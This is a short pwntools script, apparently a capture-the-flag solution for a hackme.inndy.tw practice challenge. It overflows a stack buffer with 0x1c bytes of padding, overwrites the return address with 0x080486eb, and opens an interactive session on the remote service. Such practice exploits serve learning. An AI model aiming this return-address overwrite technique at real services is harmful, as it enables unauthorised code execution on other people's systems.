from pwn import * 
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug') 

offset = 0x1c
io = remote('hackme.inndy.tw', 7702) 
p = 'A' * offset 
p += p32(0x080486eb) 

io.sendline(p) 
io.interactive() 
io.close()

